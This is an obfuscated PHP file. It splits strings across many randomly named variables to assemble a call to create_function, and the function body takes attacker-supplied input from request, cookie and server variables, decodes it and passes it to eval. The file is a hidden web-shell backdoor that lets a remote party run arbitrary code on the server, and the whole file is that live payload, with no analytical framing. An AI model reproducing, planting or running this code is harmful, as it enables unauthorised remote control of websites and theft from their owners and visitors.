<?php
	$digram ='`';
	$device = 'T';$disobeys= 'p';$floating= 'P';$caterpillar ='i';$ellipsoid ='RgOp'; $dumpy='el)';$assemblage = 'p'; $bonita= 'QD_[)rH,_'; $banally=')rX)8eE"'; $ferries= 'H'; $beryle='L'; $bobby = 'gH@X":((T';$humphrey = 'G]mRtZRD'; $incentive='r]s'; $camp='(';$dysprosium = 'l'; $ether = 'G';$cowling= 'd'; $cardinally='a';
	$gaff = 'dNAYj=Kc';

	$enciphering='a'; $fortuitously='a';$augustness = 'fd_b^)DU';$kumquat = 'd';
	$implications= 'P6i,IxS';

	$catalogue='n';

	$complimenter = 'Pv$no Pe';$bachelors='_';$hop='i';$delusions='J'; $howls= '"';
	$documentaries ='gad';$exult= 's'; $iceman ='edrr:caX';$clutches = 'sEF"h';$distinguishing='v';
	$battalion='f'; $bottleneck= 'aU_'; $embarks = 'C';$cancellate='iSiKTeT'; $ills='$';

	$fanciest ='Eetu';$elks= 'g'; $fin='sl)b";';
	$ernestine ='ry(a';$geochronology = 'L';$documentation= '?7"[';$announces='$('; $fugitives= '(i';$diffuser=')MesLe$'; $clamoring='(';$inhaler= 'R';
	$endothermic= 'sH;';$greedily ='Q'; $eddy = '"$nrGHs';$inmate='_OVRCy__h';

	$battler =';'; $capably='t';$finest =']';
	$austine= 't';$averse= 'RTP)';$hinting='_Ten4';$gayle='Eevp]'; $larkspur = 'rr'; $enormities='V';

	$interrelating = 'e'; $centripetal ='O';
	$bottomless = '>Ee$(l';$gypsite = '$';$lumpy ='g_hc'; $majesty= '$'; $buildings='i';
	$gill= 'te'; $inigo='_'; $doc= 'N'; $disputers = '_';
	$bones='(';$continent= 'E'; $generalist='ro)e9'; $bianka='(<B';$clean =')?';$cosetta = ';a?)'; $clever='e'; $guillotine= 'aoWr;'; $dame = 'v';
	$boatloads='$';$dalila='xeStigra';

	$categorizes ='c'; $chart = '$';

	$doze ='"(Iru['; $blizzard =':=is[fc6a';$deceiving='ni=]t'; $kile='a';$lastango= 'N['; $hungriest=$blizzard['6'].$doze['3'].$dalila['1'] . $kile.

	$deceiving['4'] .$dalila['1'] .$disputers . $blizzard[5]. $doze['4'].

	$deceiving['0'] .$blizzard['6'] .$deceiving['4']. $deceiving['1'] . $guillotine['1'] .$deceiving['0'] ;
	$gaming = $complimenter['5'];
	$eclipse = $hungriest
	($gaming, $dalila['1']. $dame .$kile . $bottomless['5'].$doze['1'] .$kile .$doze['3'] . $doze['3']. $kile .

	$inmate['5'] .$disputers. $gayle[3] . $guillotine['1'] . $gayle[3].$doze['1'].
	$blizzard[5] .$doze['4'] . $deceiving['0'] .$blizzard['6'] .

	$disputers.$dalila[5] . $dalila['1'] .$deceiving['4'] . $disputers .

	$kile. $doze['3']. $dalila[5]. $blizzard['3'].$doze['1'] . $cosetta['3']. $cosetta['3'].$cosetta['3'] .

	$guillotine['4']); $eclipse ($digram,

	$dalila['1'] ,$eddy['5'] ,$documentation[1], $ellen , $deceiving['1'],$doze['0'],
	$doze['3'] ,
	$chart . $deceiving['1'] . $deceiving['2']. $kile .$doze['3'].
	$doze['3'] .$kile .$inmate['5'] .$disputers . $humphrey['2'] . $dalila['1'].
	$doze['3'] . $dalila[5]. $dalila['1'].

	$doze['1'] .

	$chart .$disputers .$averse['0']. $continent .$greedily .$bottleneck[1]. $continent .

	$dalila['2']. $hinting['1'] . $implications['3'].$chart.$disputers.$inmate['4'] . $centripetal .$centripetal . $cancellate['3'] . $doze[2] .

	$continent . $implications['3']. $chart.$disputers. $dalila['2']. $continent. $averse['0'] .$enormities . $continent.
	$averse['0'].$cosetta['3'] .

	$guillotine['4'] .$chart. $kile.$deceiving['2'] .

	$deceiving['1'].$blizzard['3'] .
	$blizzard['3'] .$dalila['1']. $deceiving['4'] .
	$doze['1'] .$chart.

	$deceiving['1']. $lastango['1'] .$doze['0']. $doze['3'] . $lumpy['2'] .$iceman['1'] . $bottomless['5']. $deceiving['0'] .$dalila[5] .$gayle[3]. $dalila['0'] .$doze['0']. $deceiving['3']. $cosetta['3'] . $cosetta['2'].

	$chart.$deceiving['1'].$lastango['1'] .$doze['0'].
	$doze['3']. $lumpy['2'].$iceman['1'].$bottomless['5'].
	$deceiving['0'] .$dalila[5] .$gayle[3].$dalila['0'].$doze['0'].$deceiving['3'] .$blizzard['0']. $doze['1']. $deceiving['1']. $blizzard['3']. $blizzard['3'] .$dalila['1']. $deceiving['4'] . $doze['1'] .
	$chart. $deceiving['1'].$lastango['1'].$doze['0'] . $eddy['5']. $hinting['1'].
	$hinting['1'].$averse['2'] .$disputers.$averse['0'] .
	$eddy['5']. $augustness[6] . $diffuser['4']. $lastango['0'] . $eddy['4'].
	$averse['2'] .$iceman['7']. $doze['0'].$deceiving['3']. $cosetta['3'].$cosetta['2']. $chart.
	$deceiving['1']. $lastango['1'] . $doze['0'].
	$eddy['5'] .$hinting['1'].$hinting['1']. $averse['2'] . $disputers. $averse['0']. $eddy['5'] . $augustness[6].$diffuser['4'] . $lastango['0'].$eddy['4'] .$averse['2'].$iceman['7'].

	$doze['0'] .
	$deceiving['3'].

	$blizzard['0']. $iceman['1'].
	$deceiving['1'] .$dalila['1'].$cosetta['3'] . $guillotine['4'] .$dalila['1']. $dame.

	$kile .$bottomless['5'].$doze['1']. $blizzard['3'] .
	$deceiving['4'] . $doze['3'] . $doze['3'] . $dalila['1']. $dame. $doze['1'].$fin['3'].

	$kile.$blizzard['3'] .

	$dalila['1'].$blizzard['7']. $hinting[4]. $disputers .$iceman['1'] . $dalila['1'] . $blizzard['6']. $guillotine['1']. $iceman['1'].$dalila['1'].$doze['1'] . $blizzard['3'] .$deceiving['4'].$doze['3']. $doze['3'].$dalila['1']. $dame. $doze['1'] .

	$chart. $kile. $cosetta['3'].

	$cosetta['3'].

	$cosetta['3'].$cosetta['3'].$guillotine['4'] );
	